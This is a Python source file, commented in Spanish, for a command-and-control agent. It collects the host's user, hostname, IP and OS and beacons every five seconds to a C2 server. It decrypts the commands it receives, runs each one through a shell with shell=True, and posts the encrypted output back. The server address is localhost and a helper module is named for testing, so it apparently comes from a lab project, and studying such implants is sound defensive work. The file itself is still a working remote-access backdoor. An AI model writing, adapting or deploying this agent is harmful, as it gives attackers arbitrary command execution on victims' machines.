import time, requests, os, platform, subprocess, socket, testingcrypto_c2

# Configuración de red del Servidor C2
C2_URL = "http://localhost:8080"
INTERVALO_BEACON = 5

def get_system_info():
    try:
        name = os.getlogin() + "@" + platform.node()
    except Exception:
        name = "UnknownAgent@" + platform.node()

    os_type = f"{platform.system()} {platform.release()}"

    # Obtener IP interna de forma segura
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except Exception:
        ip = "127.0.0.1"

    return name, ip, os_type

def main():
    agent_name, agent_ip, agent_os = get_system_info()
    print(f"[*] Iniciando Agente C2: {agent_name}")
    print(f"[*] Conectando a {C2_URL} cada {INTERVALO_BEACON} segundos...")

    while True:
        command = None
        try:
            # 1. Enviar el BEACON
            params = {"name": agent_name, "ip": agent_ip, "os_type": agent_os}
            response = requests.get(f"{C2_URL}/api/beacon", params=params, timeout=4)

            if response.status_code == 200:
                encrypted_response = response.json()

                if "ciphertext" in encrypted_response:
                    data = testingcrypto_c2.decrypt_data(encrypted_response)
                    command = data.get("command")

                # 2. Si hay un comando en cola, lo ejecutamos en el sistema operativo
                if command:
                    print(f"[+] Comando cifrado recibido y descifrado: {command}")

                    # Ejecución nativa usando subprocess de Python (captura stdout y stderr)
                    # Usamos shell=True para permitir comandos directos de terminal
                    process = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        errors='ignore'
                    )

                    # Combinamos la salida estándar y la de errores
                    output = process.stdout if process.stdout else ""
                    if process.stderr:
                        output += f"\n[ERROR]: {process.stderr}"
                    if not output.strip():
                        output = "[+] Comando ejecutado con éxito (Sin salida de texto)."

                    raw_payload = {"name": agent_name, "result": output}
                    encrypted_payload = testingcrypto_c2.encrypt_data(raw_payload)

                    # 3. Devolver el resultado real de tu máquina al servidor web del C2
                    requests.post(f"{C2_URL}/api/result", json=encrypted_payload, timeout=4)
                    print("[*] Resultado cifrado con AES-GCM enviado a la GUI.")

        except requests.exceptions.ConnectionError:
            print("[!] Servidor C2 offline. Reintentando...")
        except Exception as e:
            print(f"[!] Error inesperado en el agente: {e}")

        time.sleep(INTERVALO_BEACON)

if __name__ == "__main__":
    main()